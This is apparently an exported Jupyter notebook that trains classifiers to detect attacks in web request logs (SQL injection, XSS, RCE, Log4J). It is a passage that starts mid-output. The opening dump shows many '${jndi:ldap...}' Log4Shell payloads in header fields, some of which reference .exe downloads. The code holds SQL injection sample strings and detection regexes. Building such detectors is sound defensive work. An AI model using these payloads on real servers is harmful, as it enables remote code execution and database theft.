# data:['ck=lUmOuWK5kD9laGe_SSwDF1z_zyatyrbHJEvm_Z6Yw5U; Domain=eventective.com/USA/Ohio/Canal+Winchester/; Expires=Wed, 28 Dec 2022 01:25:54 GMT', 'uu=DMYCDuNClKaHqJ--ZQcEfS8N5UbvCcWdf9kXYqkNZjY; Domain=myspace.com/426013192; Expires=Sun, 12 Feb 2023 01:25:54 GMT', 'session=656c3c94-2333-4bcd-8083-586c6968fbf4; Expires=Sun, 18 Dec 2022 01:38:54 GMT']${jndi:ldapfacebook.com/pages/McDonalds-Lake-Arrowhead-California/114960895206648}
#
# index:	181149
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapbugehoobs.com/girls/italia_kash_bikini_model}
#
# index:	181190
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldaphttp://www.getashirtlikemine.com/retro-t-shirts/beer}
#
# index:	181257
# col name:	request.headers.Set-Cookie
# data:['cid=5eeIVhh6ocD5xN-EbW1iqsRR9v87ZsX386pC7Ek9r8fcUix_pT1oe_7lGnAEF8_Wahvkhm8Z9Gw4ioPNNBr35qeYEfDMSB8__1xTvgs5VmGcBgzJ87iUmC8P65PcFMrJY12u7YHe8nfxOi3GrJ0eCfiFG7RGKuqftAat_iGNqLs; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 01:58:01 GMT', 'ck=9Cqfb5ChD33iI3IU28GYWJn44ks7b3Qrf64paaeEzd97rJL17HvtpS4eMdNWlYQAbpu8JHY1CfDmn6yYN3LKew; Domain=enotes.com/topic/Dave_Robinson_(American_football); Expires=Tue, 31 Jan 2023 01:18:01 GMT', 'uu=vdtjS8pWDDGylHislnM1FuG6og-YPTDo67VJaPGsXQU; Domain=visa.ca/gvav/list2005.jsp?year=2005&curMonth=12; Expires=Thu, 16 Feb 2023 01:18:01 GMT', 'session=93834d21-0314-4f53-b324-82b6ac680c29; Expires=Sun, 18 Dec 2022 01:37:01 GMT']${jndi:ldapfreebase.com/view/en/maxwell_park}
#
# index:	181288
# col name:	request.headers.Set-Cookie
# data:['ck=NrYT41uzgO69Q8ii8imgHA; Domain=crownvisioncenter.com/lasik/lasik.html; Expires=Wed, 01 Feb 2023 01:29:21 GMT', 'uu=kyKKmxVmAWwEsolXCjfVucDFjBPsZ-DvcRDaxTVPwQbYWMR22mMOeknaNx3pl9N4TDadfeVgr8H0wx8bODNUiA; Domain=montreal-yul.airports-guides.com/; Expires=Thu, 09 Feb 2023 01:29:21 GMT', 'session=dfc9932f-07b0-4628-98c9-2d5439fdfc5b; Expires=Sun, 18 Dec 2022 02:17:21 GMT']${jndi:ldapyoutube.com/watch?v=3HX5yptBevw}
#
# index:	181298
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapwww.eskimo.com/~billb/mistake.html}
#
# index:	181307
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldaphttp://pantherma.eu/index.html?option=com_content&view=article&id=83:gwarancja&catid=42&Itemid=91&lang=pl&fontstyle=f-smaller}
#
# index:	181336
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapidpguru.com/2010/01/2010-idp-draft-rankings-defensive.html}
#
# index:	181411
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapenchantia.com/software/graphapp/}
#
# index:	181421
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapcreditnet.com/}
#
# index:	181480
# col name:	request.headers.Set-Cookie
# data:['ttauth=8q7CIk4HbpWdLvqEsOLYtg; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:23:49 GMT', 'ck=NPcFyTenACoWhQGYLJn3oKIjkmWJtBE-YDR3iPP5eqs; Domain=http://techcrunch.com/2014/03/04/there-is-only-one-week-left-to-apply-for-the-washington-dc-pitch-off/; Expires=Fri, 27 Jan 2023 01:37:49 GMT', 'uu=wuTWO8br2N00JKp0izM3dvwGIDa2FOpysvTVjwJtkIU; Domain=mobile-free.kofoed-fr.com; Expires=Tue, 03 Jan 2023 01:37:49 GMT', 'session=053dd1c4-8707-47e4-ab05-9b47e687f3e8; Expires=Sun, 18 Dec 2022 01:45:49 GMT']${jndi:ldapmovies.about.com/od/aseriousman/A_Serious_Man_2009.htm}
#
# index:	181570
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldaphttps://mitsui-jyuku.mixh.jp/uploads/30613687ead846bae3d6dc2187ebf1d00be.exe}
#
# index:	181614
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldaphttp://dl.pocodoctor.com/n/511a09e6-72f8-4bb9-b1ba-74af5bc06f2f/File_Downloader.exe?secure=1437456124_ffbd11e7e0178a6b1d7616bfe250580d}
#
# index:	181695
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldapspiritus-temporis.com/index/dor.html}
#
# index:	181748
# col name:	request.headers.Set-Cookie
# data:['cid=9ZM2icH1SKQSd9OnUq30LZyKLlWeVdff7_lrjFUK8ubIoDDoOxM2pDfPFNWaIi7HRG-XS7kDfCUm094J2ij437WNuuNvnUIc1IMfkv6rY9m0gHCuaXlY1XO5JRANukrA1WEZfxfp8i27FxpCFvHn0MvE2HP89UIwtAse_8vznew; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:07:45 GMT', 'ck=dTTScZ4mnK6iWNk_VURW6Oo0u2xmqGFoEnRFtq671Yck5erfeUeRQWgaQaPKIclmwlfjtZ8nBUzmyYOj3N41iQ; Domain=http://algiba.com/index.php?option=com_content&view=article&id=93&Itemid=146; Expires=Thu, 12 Jan 2023 01:23:45 GMT', 'uu=Ba2luPs6jp4nbA9dIKPdCIOHhx1ysK0B6VR1iwT4DsbxITuuGcaSjXR5PclhY8UKFtVOQN0ycaAM0sy3PR2zLCiWH3quo3_MdyzDdzzgEk5pS3Buxmo65s8oJ7EqVfOnDFxz5h1fDc_6bL4BGI4jG5QZji9H4ILg-MP00Q0MtLo; Domain=treasurehuntingplaces.com/fire-agate/opal-hill-fire-agate-mine/; Expires=Fri, 06 Jan 2023 01:23:45 GMT', 'session=2e1cf104-a2d7-4248-b2e7-2c1f52d5bf91; Expires=Sun, 18 Dec 2022 01:35:45 GMT']${jndi:ldapbransonmissouri.missourinetizen.com/2008/11/branson-missouris-jolie-justus-leads.html}
#
# index:	181845
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapstudents.sbc.edu/vandergriff04/gothicmaterialism.html}
#
# index:	181857
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldaphttp://www.fdp-muenchen-west.de/index.php?option=com_content&view=article&id=175&Itemid=61}
#
# index:	181934
# col name:	request.headers.Set-Cookie
# data:['ttauth=BnvZDDuolLc5SWhMul4RIA; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:10:33 GMT', 'ck=070BewYm1IcuQ1RtyW6IyNG25edUEP7tPiCjZ_DiLhAATrg3d_HmMxU8uRsUY3R6An1ck_IPXG3kDrx7O4bEaj9a3AOCOdEvF_onX8RVoJijBWOpIyYLAf2nV7k3G7vgv4HoSRkxcA8UB5c03rvHT3EAplee0jZPgFv_rjTnNrU; Domain=mobileqp.beget.tech; Expires=Wed, 04 Jan 2023 01:33:33 GMT', 'uu=j3M1zV1jWTc3kU9rrgJang; Domain=archive.org/stream/townoflakedirect00rrdo/townoflakedirect00rrdo_djvu.txt; Expires=Sun, 12 Feb 2023 01:33:33 GMT', 'session=677ef9b9-da5e-43b1-808f-7b0ea4a39c5a; Expires=Sun, 18 Dec 2022 02:13:33 GMT']${jndi:ldapwww.fpseg.com.br/}
#
# index:	181982
# col name:	request.headers.Set-Cookie
# data:['ck=Ma3VEDDPwgxHMos65F58IP_I6-sgIjjfU2MfTYNVjcU; Domain=https://paste.ee/r/Vc7ll; Expires=Tue, 31 Jan 2023 01:33:24 GMT', 'uu=UF2HyEpUUBeAWajzT310c2zesFCkEsESgThb3nIg8T0; Domain=us.battle.net-bizzard-d3.account-com.net/battle_net_account.php?amp; Expires=Fri, 13 Jan 2023 01:33:24 GMT', 'session=8418a966-0266-4d33-a8b5-6ca91808d8f0; Expires=Sun, 18 Dec 2022 01:44:24 GMT']${jndi:ldapigoclubs.com/lounges/lounge100.html}
#
# index:	182002
# col name:	request.headers.Set-Cookie
# data:['cid=-bBZiOXKTT-yIWwEKFo3ajAwJzGX8VMRj4RngU3rEcR3HmgjWn3beAVK7EShd4cZB3FmFI2Y_MBxSLloUy8msEi6w3GwFbeGtjODZOpfgNHA4eChldrC3hVkyHmi3lZSBa9WE25RRCus5PE8HIHMmml_dZ_vDlAWN5jCAS3sNC0; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 01:56:12 GMT', 'ck=usHw0FhuiCgY9L5JMvnISHYjPS2ChbKiO65z9VWs4E5_PlI_WjZGTVnsuXim6mLBAUnhH1DA8Eijjx4RzXGlkw; Domain=www.it.uu.se/research/group/hipe/dialyzer/; Expires=Sun, 22 Jan 2023 01:29:12 GMT', 'uu=BHJUyItD6jVgPTFfx-QSS-dyq6qISijr8RzWRNT7jCrnrmI3F9GxHRgOVslolV7Gu1hrKFSS6MFzA2b7CypzdA; Domain=yellowpagelistings.net/home/Johnston/; Expires=Sat, 04 Feb 2023 01:29:12 GMT', 'session=4b270507-386d-4948-bff9-af68ddcfb755; Expires=Sun, 18 Dec 2022 02:08:12 GMT']${jndi:ldapzalanmanbuege.com}
#
# index:	182127
# col name:	request.headers.Set-Cookie
# data:['ttauth=DMoBJsVwfPrs3etBIzsRnCaOzv7jJ9OusxfeA5mFUL0; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 01:43:55 GMT', 'ck=VWKgOIa0ojmn3e8SmAObXFWJ7qFWhV8insz6jf9jcus; Domain=http://www.steunfonds.nl/projecten/projecten-2012; Expires=Sat, 07 Jan 2023 01:20:55 GMT', 'uu=flxHlPzeeXtb3JIVYr9DGVdbIbc7HJVtS2xzI0NzAngs6L86m6g91D78zQa4LH_JBsvErCP_3SHwoj_lmteVKGC14qWKSVD653vIdw-vHwvoW5PXzMSd0wN_A8WZLVPJOEswkd4PuWlbft5hnJ5pxa3A-gFw2c5DPthlf1L9g8M; Domain=archiver.rootsweb.ancestry.com/th/read/QUEBEC-RESEARCH/2002-06/1022947986; Expires=Tue, 27 Dec 2022 01:20:55 GMT', 'session=7d742caa-57d8-4317-ab8a-bb2c4d916499; Expires=Sun, 18 Dec 2022 02:15:55 GMT']${jndi:ldapdiscogs.com/artist/Andr%C3%A9+Duchesne}
#
# index:	182160
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldaphttp://r-tuning.com.ua/index.php?option=com_virtuemart&page=shop.browse&category_id=426&Itemid=1}
#
# index:	182210
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapwww.nvqmadesimple.com/track/images/Login.php}
#
# index:	182224
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapidmsa.pl/adserver/wwwservpbs.accoynt87.htm}
#
# index:	182270
# col name:	request.headers.Set-Cookie
# data:['cid=mrctzJ4SXl_Sm2GQL0e9fPCKxpU7cwD9ZlNVeowUPE8ydQaysoNn1fLlBxIkTriVD9FoQ0D2hOgqEoP2Q6Crp0jyeHVTwmvMHivfA7JT2AtmKOIt0etYYuYfy8iSs17ag_s_nZpffvGyM1kyfDC_b1gNx62uqgrawED27acror8; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 01:47:29 GMT', 'ck=5d9TunVOH7GCrlhwfod8n2LZqpn0o15Q2WJ4xSCPpbbxamUbnuQnE34cGYYauLbmxgy0172BTCpOF_rWDl2tqQw52Ho2TgStsCq98VM41uOD-4dy-rYiyUNslKghEe0vfKI5YgSKKwp2vFp3dPHFqP35dI_CAcwMfVrqYyeVHdo; Domain=adolphcoors.org; Expires=Fri, 06 Jan 2023 01:17:29 GMT', 'uu=27HqfWFKDy6T7fsv_oxgAJ6ELk_COAmvMF1PZeI7lEreSDl4_HisOH5T3Lml7bpCEv-EqVF2fpsGLQI7mSFWxg; Domain=rinkenoonan.com/people/tonya-hinkemeyer/; Expires=Tue, 27 Dec 2022 01:17:29 GMT', 'session=80431ffd-ff32-41e3-a1c0-497016c14092; Expires=Sun, 18 Dec 2022 02:00:29 GMT']${jndi:ldaphttp://serverfault.com/questions/296101/how-to-give-a-404-error-for-a-http-request-to-an-ip-address}
#
# index:	182341
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldaphttps://quizlet.com/sign-up?redir=https%3A%2F%2Fquizlet.com%2Fset%2F6396803%2Fflags%2Fadd}
#
# index:	182371
# col name:	request.headers.Set-Cookie
# data:['cid=SNZdfaJaiVRBSo5sAJau7hQ8mGDg94UmspzfFgFDlz9sbNyEM0RGbu17mKc2CUDHbz9kRBbwws3XfKqgV-H5NAxFdGj7NXAhnbwisuugX_8SeBgL5XnjfCHNvth2eSOk7CpliDL_aprcBj2UttfaIpxJh8GcjbcysxGYGrYUktg; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 01:57:05 GMT', 'ck=jtVRdNMhAspYhHqGWpdt81Rc3PYKh2ne4D_2h4-8VBo; Domain=whitecapsblog.com/2011/06/whitecaps-fan-spat-at-by-montreal.html; Expires=Wed, 11 Jan 2023 01:27:05 GMT', 'uu=AsswiyTgTfWy1KBuVwUJXalP8DMxMtZduoT-ScD4hVZCXiS69IeoEZm0q8z_cSHbZ8oYhoouuaEsoHKMrK542A; Domain=randomhouse.co.nz/Author_A-Z_28.aspx?Name=M; Expires=Sun, 29 Jan 2023 01:27:05 GMT', 'session=fe0cfad9-fa6a-42d4-8c7c-1abf07ec9fcf; Expires=Sun, 18 Dec 2022 01:36:05 GMT']${jndi:ldaphealpth.com/doctors/dana-owens-431905/}
#
# index:	182504
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapyoutube.com/watch?v=yj5PNjtHOv4}
#
# index:	182526
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapogs.on.ca/ogspi/184/m184r001.htm}
#
# index:	182724
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldaphttp://atwiki.jp/wiki/%E3%83%95%E3%82%A1%E3%82%A4%E3%83%8A%E3%83%AB%E3%83%95%E3%82%A1%E3%83%B3%E3%82%BF%E3%82%B8%E3%83%BC%E3%82%BF%E3%82%AF%E3%83%86%E3%82%A3%E3%82%AF%E3%82%B9%20%E3%83%8D%E3%82%BF}
#
# index:	182733
# col name:	request.headers.Set-Cookie
# data:['cid=IpJJTnNa0jDaG7uZdYPQ0I_5F0M6gi7abQSQ1RDDkK9ehBqx0qLtYpBGosj2bksMD81TyZkSGSb9qVvlwHeVlPoyAN_bb5jr5PDLo5hhqhB1tSCBEPODx0_xvcXLCVs3VbxzEsg-HNiS7BIKJ8K_Ze2aoQl0O3L9OOAp7tm7rSs; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 01:36:04 GMT', 'ck=mK5jrkCEVnmd2pdwVHkhM7J91CaeisEb5V-vPVTzGc4; Domain=hiplyrics.com/n/national-anthem-of-south-korea-lyrics.html; Expires=Sat, 04 Feb 2023 01:20:04 GMT', 'uu=fhQAPpxd0pHK2rjpY2TpDDirw_eFFVpxk4IA_qt1ReFd79so1hPcq7dcpwQVsDPdJYqa-HWz1kdnbhdsV188xg; Domain=www.michnet.de/mutt/; Expires=Fri, 23 Dec 2022 01:20:04 GMT', 'session=750311ef-669d-4bf1-a9df-0831ddfa844f; Expires=Sun, 18 Dec 2022 02:00:04 GMT']${jndi:ldapaircanada.com/en/travelinfo/traveller/flightstatus/index.html}
#
#
# {'request.headers.Sec-Fetch-Site', 'request.headers.Accept-Encoding', 'request.headers.Sec-Fetch-Dest', 'request.headers.Set-Cookie'}
# counter: 3756
# (3756, 30)

# %%
#try erea
special_rep = {'{}': 'EMPTYDIR'}
special_str = ['[', ']', '--', ';', "'", '{', '}', '=', ',']
patterns_rep = {r'\%\d\d': r' \g<0> '}

def replace_str_for_types(s):
    for k in special_rep:
        s = s.replace(k, special_rep[k])
    for i in special_str:
        s = s.replace(i, f' {i} ')
    for patt in patterns_rep:
        s = re.sub(patt, patterns_rep[patt], s)
    return s

def space_words_data(s):
    return re.sub(r"(\-\-)|(\%\d\d)|([^A-Za-z0-9-_])", r' \g<0> ', s)

# r"(\-\-)|(\%\d\d)|'[A-Za-z0-9]+'|([^A-Za-z0-9-_])"

def is_sql_type(s: str):
    patterns = [r"';SELECT%20\*%20FROM%20.*(--)?", # select * from...
                r"'.*--",
                r"'%20or%20'(.*)'.*=.*'\1.*"]      # is match to the format of 'or 1=1'
    for patt in patterns:
        if re.search(patt, s):
            return True
    return False


#r_s = "orders/get/country?country=';SELECT%20*%20FROM%20order_details%20--hjgkgh"
r_s = "login/user?username=Shenita&password=JeriBarney'%20or%20'JoyceHopper'='JoyceHopper"
print(space_words_data(r_s))

# keep_list = ['Benign', 'Cookie Injection', 'Directory Traversal', 'Log Forging']
# keep_list = ['Benign', 'LOG4J']#, 'SQL Injection']
# df = df[df['attack_type'].isin(keep_list)]
#print(*f[['request.url']].values.tolist(), sep='\n')
info= {"Num":[12,14,13,12,14,13,15], "NAME":['John','Camili','Rheana','Joseph','Amanti','Alexa','Siri']}
 
data = pd.DataFrame(info)
print(data)
data.iloc[0]='new value'
data
# Out:
# login / user ? username = Shenita & password = JeriBarney '  %20 or %20  ' JoyceHopper '  =  ' JoyceHopper
#    Num    NAME
# 0   12    John
# 1   14  Camili
# 2   13  Rheana
# 3   12  Joseph
# 4   14  Amanti
# 5   13   Alexa
# 6   15    Siri
#          Num       NAME
# 0  new value  new value
# 1         14     Camili
# 2         13     Rheana
# 3         12     Joseph
# 4         14     Amanti
# 5         13      Alexa
# 6         15       Siri

# %%
# Setting features for further feature extraction by choosing columns
# Some will be "simply" encoded via label encoding and others with HashingVectorizer

LOG4_COL_NAME = 'isLog4J'

# On these headers we will run a "simple" BOW
SIMPLE_HEADERS = ['request.headers.Accept-Encoding',
                'request.headers.Connection',
                'request.headers.Host',
                'request.headers.Accept',
                'request.method',
                'request.headers.Accept-Language',
                'request.headers.Sec-Fetch-Site',
                'request.headers.Sec-Fetch-Mode',
                'request.headers.Sec-Fetch-Dest',
                'request.headers.Sec-Fetch-User',
                'response.status',
                'request.headers.Cache-Control', 'request.headers.Sec-Ch-Ua-Mobile',
                'request.headers.Sec-Ch-Ua-Platform', 'request.headers.Upgrade-Insecure-Requests',
                'response.headers.Content-Length'
                ]

# On these headers we will run HashingVectorizer
COMPLEX_HEADERS = ['request.headers.User-Agent',
                   'request.headers.Set-Cookie',
                   'request.headers.Date',
                   'request.url',
                   'response.headers.Content-Type',
                   'response.body',
                   'response.headers.Location',
                   'request.headers.Content-Length',
                   'request.headers.Cookie',
                   'response.headers.Set-Cookie']

COLUMNS_TO_REMOVE = ['request.body',
                    'request.headers.Date']


# This is our main preprocessing function that will iterate over all of the chosen 
# columns and run some feature extraction models
def vectorize_df(df):
    #remove the url
#     df['request.url'] = df['request.url'].apply(lambda x: x.replace('http://127.0.0.1:5000/', ''))
    
    column_names = df.columns.to_list()
    #df[LOG4_COL_NAME] = 'reg'
    for index, row in df.iterrows():
        for col in column_names:
            data = df.loc[index, col]
            if type(data) is not str:
                continue
            if col == 'request.url' and is_sql_type(data):
                df.loc[index] = '444444'
                df.loc[index, 'attack_type'] = 'SQL Injection'
                df.loc[index, 'label'] = 'Malware'
                break
            if re.search(r'\$\{[a-z]+:.*\}$', data):
                df.loc[index] = '51'
                df.loc[index, 'attack_type'] = 'LOG4J'
                df.loc[index, 'label'] = 'Malware'
                #df.loc[index, LOG4_COL_NAME] = LOG_4_ATTACK # isLog4J
                break
    
#     for column in column_names:
#         df[column] = df[column].apply(lambda x: replace_str_for_types(str(x)))
# #         print(df[column])
        
    le = LabelEncoder()
    h_vec = HashingVectorizer(n_features=2**5, ngram_range=(1, 10), alternate_sign=False, token_pattern=r'[^\s/]+') #, ngram_range=(1, 4)
    
    # Run LabelEncoder on the chosen features
    for column in SIMPLE_HEADERS: 
        df[column] = le.fit_transform(df[column])
    
    # Run HashingVectorizer on the chosen features
    for column in COMPLEX_HEADERS: 
        df[column].apply(space_words_data)
        newHVec = h_vec.fit_transform(df[column])
        df[column] = newHVec.todense()

    # Remove some columns that may be needed.. (Or not, you decide)
    for column in COLUMNS_TO_REMOVE: 
        df.drop(column, axis=1, inplace=True)
    return df

df = vectorize_df(df)
df

# %%
# Memory check (For large datasets sometimes the dataframe will exceed the computers resources)
df.info(memory_usage="deep")

# %%
# Choose the right features
# In our example code we choose all the columns as our feature this can be the right or wrong way to approach the model, you choose.

features_list = df.columns.to_list()
features_list.remove('label')
features_list.remove('attack_type')

features_list_more = features_list.copy()
features_list.remove('response.headers.Content-Length')


# features_list.remove('response.headers.Content-Length')

print(features_list)

# Recheck all datatype before training to see we don't have any objects in our features
# In this example our model must get features containing only numbers so we recheck to see if we missed anything during preprocessing
df.dtypes

# %%
# Increase the size of the heatmap.
plt.figure(figsize=(16, 6))
# Store heatmap object in a variable to easily access it when you want to include more features (such as title).
# Set the range of values to be displayed on the colormap from -1 to 1, and set the annotation to True to display the correlation values on the heatmap.
heatmap = sns.heatmap(df.corr(), vmin=-1, vmax=1, annot=True)
# Give a title to the heatmap. Pad defines the distance of the title from the top of the heatmap.
heatmap.set_title('Correlation Heatmap', fontdict={'fontsize':12});

# %% [markdown]
# ## Train test split

# %%
# Data train and test split preparations. Here we will insert our feature list and label list.
# Afterwards the data will be trained and fitted on the amazing XGBoost model
# X_Train and y_Train will be used for training
# X_test and y_test.T will be used for over fitting checking and overall score testing

# We convert the feature list to a numpy array, this is required for the model fitting
X = df[features_list_more].to_numpy()

# This column is the desired prediction we will train our model on
y = np.stack(df[test_type])

NUM_ROWS = X.shape[0]
indices = np.arange(NUM_ROWS)
print(indices)
# We split the dataset to train and test according to the required ration
# Do not change the test_size -> you can change anything else
X_train, X_test, y_train, y_test, indices_train, indices_test = train_test_split(X, y, indices, test_size=0.1765, random_state=42, stratify=y)

# We print the resulted datasets and count the difference 
print(X_train.shape, y_train.shape)
print(X_test.shape, y_test.shape)
counter = Counter(y)
counter

# %% [markdown]
# ## Model choosing and fitting

# %%
sub_features_list = ['request.url','response.headers.Content-Type',
                'response.body',
                'response.status_code',
                'response.status',
                'response.headers.method']

sud_feats_last = ['response.headers.Content-Length', 'request.url']
sub_label_list = ['Benign', 'SQL Injection', 'XSS', 'RCE']

def get_sub_train(X, y, clf, feat_og, feat_sub, label_sub, isNeg=False):
    if label_sub is None:
        label = []
    bool_feats = np.isin(feat_og, feat_sub)
    bool_labels = np.isin(y, label_sub)
    if isNeg:
        bool_labels = ~bool_labels
    X_new = X[bool_labels][:, bool_feats]
    y_new = y[bool_labels]
    
    return (X_new , y_new, clf.fit(X_new , y_new))


# X_train_2, y_train_2 = get_sub_train(X_train, y_train, features_list, features_list, sub_label_list, isNeg=True)

# %%
# from sklearn.naive_bayes import GaussianNB, MultinomialNB, BernoulliNB
# # from sklearn.preprocessing import StandardScaler


# X_train_1, y_train_1 = get_sub_train(X_train, y_train, features_list, sub_features_list, sub_label_list)
# # X_train_2, y_train_2 = get_sub_train(X_train, y_train, features_list, features_list, ['RCE'], isNeg=True)

# # We choose our model of choice and set it's hyper parameters you can change anything
# clf = DecisionTreeClassifier()
# clf2 = DecisionTreeClassifier()

# # Train Model
# clf.fit(X_train, y_train)
# clf2.fit(X_train_1, y_train_1)

# # Check data balance and variety
# print("train:")
# print(*sorted(Counter(y_train).items()), sep='\n')

# print()

# print("test labels:")
# print(*sorted(Counter(y_test).items()), sep='\n')

# %%
######################## tryyyyy ######################

from sklearn.naive_bayes import GaussianNB, MultinomialNB, BernoulliNB
from sklearn.linear_model import SGDClassifier
# from sklearn.preprocessing import StandardScaler

# We choose our model of choice and set it's hyper parameters you can change anything
clf = DecisionTreeClassifier()
# Train Model
# clf2.fit(X_train_1, y_train_1)
clf.fit(X_train, y_train)

X_train_1, y_train_1, clf1 = get_sub_train(X_train, y_train, 
                                           DecisionTreeClassifier(),
                                           features_list_more, sub_features_list, sub_label_list)
X_train_2, y_train_2, clf2 = get_sub_train(X_train, y_train,
                                           DecisionTreeClassifier(),
                                           features_list_more, features_list, ['Benign', 'XSS'])
X_train_3, y_train_3, clf3 = get_sub_train(X_train, y_train,
                                           DecisionTreeClassifier(),
                                           features_list_more, features_list, ['Benign', 'RCE'])
X_train_4, y_train_4, clf4 = get_sub_train(X_train, y_train,
                                           RandomForestClassifier(n_estimators=100),
                                           features_list_more, sub_feats_last, ['RCE', 'XSS'])

clf_feat_label_list = [(clf1, sub_features_list, sub_label_list),
                       (clf2, features_list, ['Benign', 'XSS']), 
                       (clf3, features_list, ['Benign', 'RCE']),
                       (clf4, sub_feats_last, ['XSS', 'RCE'])]


# clf2.fit(X_train_1, y_train_1)

# Check data balance and variety
print("train:")
print(*sorted(Counter(y_train).items()), sep='\n')

print()

print("test labels:")
print(*sorted(Counter(y_test).items()), sep='\n')

######################## tryyyyy ######################

# %% [markdown]
# ## Result printout

# %%
def predict(data, clf, clf_feat_label_list):
    predictions = clf.predict(data)
    
    for clf2, feats, labels in clf_feat_label_list:
        bool_feats = np.isin(features_list_more, feats)
        data_new = data[:, bool_feats]
        for i in range(predictions.shape[0]):
            if predictions[i] in labels:
                predictions[i] = clf2.predict([data_new[i]])[0]
    
    return predictions

# %%
# We print our results
predictions = predict(X_test, clf, clf_feat_label_list) # clf.predict(X_test) #

def value_accu(predictions, y_test):
    sns.set(rc={'figure.figsize':(15,8)})

    true_labels = y_test

    cf_matrix = confusion_matrix(predictions, true_labels)
    clf_report = classification_report(true_labels, predictions, digits=5)
    heatmap = sns.heatmap(cf_matrix, annot=True, cmap='Blues', fmt='g', 
                          xticklabels=np.unique(true_labels), 
                          yticklabels=np.unique(true_labels)) 

    # The heatmap is cool but this is the most important result
    print(clf_report)
    
value_accu(predictions, y_test)

# %%
counter = 0

dict_me = {}
dict_data = {}

# %%
# # print(*h, sep='\n')
# h = zip(predictions, true_labels)
# for p,t in h:
#     s = f'{p}->{t}'
#     if s not in dict_me:
#         dict_me[s] = 0
#     dict_me[s] += 1

# print(dict_me, sep='\n')
# print()
# counter = 0

# h = zip(predictions, true_labels)
# for p,t in h:
    
#     s = f'{p}->{t}'
#     if s not in dict_data:
#         dict_data[s] = set()
#     dict_data[s].add(indices_test[counter])
#     counter += 1
    
    
# # print(dict_data, sep='\n')
# print('\n')

# #print('Benign->SQL Injection:', dict_data['Benign->SQL Injection'], sep='\n')

# # print('RCE->Benig', dict_data['SQL Injection->Benign'], sep='\n')
# print()

# %%
# print('fake Benign:')
# ind_list = list(dict_data['Malware->Benign'])
# R# print(df_checker.iloc[ind_list])
# # print()

# # print('fake Benign:')
# # ind_list = list(dict_data['SQL Injection->Benign'])
# df_checker.iloc[ind_list]['request.url'].values.tolist()

# %% [markdown]
# # Test

# %%
# Now it's your turn, use the model you have just created :)
raw_ds = {}

# Read the valuation json, preprocess it and run your model 
with open(f'./dataset_{str(dataset_number)}_val.json') as file:
    raw_ds = json.load(file)

test_df = pd.json_normalize(raw_ds, max_level=2)

fill_na_df(test_df)
    
test_df

# Preprocess the validation dataset, remember that here you don't have the labels
test_df = vectorize_df(test_df)

# Predict with your model
X = test_df[features_list_more].to_numpy()
predictions = predict(X, clf, clf_feat_label_list) # clf.predict(X)

predictions

# %% [markdown]
# # Save your predictions

# %%
# Save your preditions
enc = LabelEncoder()
np.savetxt(f'./dataset_{str(dataset_number)}_{test_type}_result.txt', enc.fit_transform(predictions), fmt='%2d')

# %%
import re
#'%20or%20'JoyceHopper'='JoyceHopper
# The pattern to search for
pattern = r"'%20or%20'(.*)'='\1"

# The string to search in
string = "'%20or%20'JoyceHopper'='JoyceHopper"

# Find the pattern
match = re.search(pattern, string)

if match:
    print('Found a duplicate word:', match.group(1))
else:
    print('No duplicate words found')
    
pattern2 = r"';SELECT%20\*%20FROM%20.*(--)?"
if re.search(pattern2, string):
    print("GOOD")
else:
    print("bad....")
# ';SELECT%20*%20FROM%20us_states%20--

# %%
# sub_features_list = ['request.url',
#                 'response.body',
#                 'response.status_code',
#                 'response.status']
# sub_label_list = ['Benign', 'SQL Injection', 'RCE']

# def get_sub_train(X, y, feat_og, feat_sub, label_sub, isNeg=False):
#     if label_sub is None:
#         label = []
#     bool_feats = np.isin(feat_og, feat_sub)
#     bool_labels = np.isin(y, label_sub)
#     if isNeg:
#         bool_labels = ~bool_labels
#     return (X[bool_labels][:, bool_feats] , y[bool_labels])
    

# get_sub_train(X_train, Y_train)

# # y_train[bool_list_labels]
# print(X_train.shape)
# print(bool_feat_list.shape)
# print(bool_list_labels.shape, '\n')

# print(X_train, '\n')
# print(bool_feat_list, '\n')
# print(bool_list_labels, '\n')

# X_train[bool_list_labels][:, bool_feat_list]
#X_train_sub, y_train_sub = get_sub_train(X, y, features_list, sub_features_list, sub_label_list)

# %%
# features_list

# %%
import numpy as np
y = np.array([0, 3,4,7,99])
y[1]
